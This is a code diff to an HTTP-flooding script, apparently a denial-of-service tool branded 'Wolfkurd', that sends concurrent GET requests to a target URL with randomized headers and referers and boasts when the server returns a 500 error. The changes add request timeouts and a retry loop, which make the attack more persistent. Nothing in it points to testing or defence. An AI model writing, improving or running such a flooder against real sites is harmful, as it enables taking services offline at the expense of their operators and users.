@@ -1,6 +1,7 @@
 import random
 import requests
 import concurrent.futures
+import time
 
 
 url = ""  # The URL you want to target
@@ -50,7 +51,7 @@ def send_request(url):
         'Referer': random.choice(headers_referers)
     }
     try:
-        response = requests.get(url, headers=headers)
+        response = requests.get(url, headers=headers, timeout=5)
         if response.status_code == 500:
             print(f"💥 Wolfkurd destroyed the server! Status code 500. Server crashed! 💥")
         elif response.status_code == 403:
@@ -59,6 +60,16 @@ def send_request(url):
             print(f"⚡ Unexpected response code {response.status_code} from {url}. Something went wrong... ⚡")
     except requests.exceptions.RequestException as e:
         print(f"💣 Wolfkurd's wrath failed! Error while sending request: {e} 💣")
+        for i in range(3):
+            print(f"🔄 Retrying... Attempt {i+1}/3")
+            time.sleep(2)
+            try:
+                response = requests.get(url, headers=headers, timeout=5)
+                if response.status_code == 200:
+                    print("✅ Retry successful!")
+                    break
+            except requests.exceptions.RequestException as retry_error:
+                print(f"⚠️ Retry {i+1} failed: {retry_error}")
 
 def main():
     print("🔥 Starting the onslaught... 🔥")
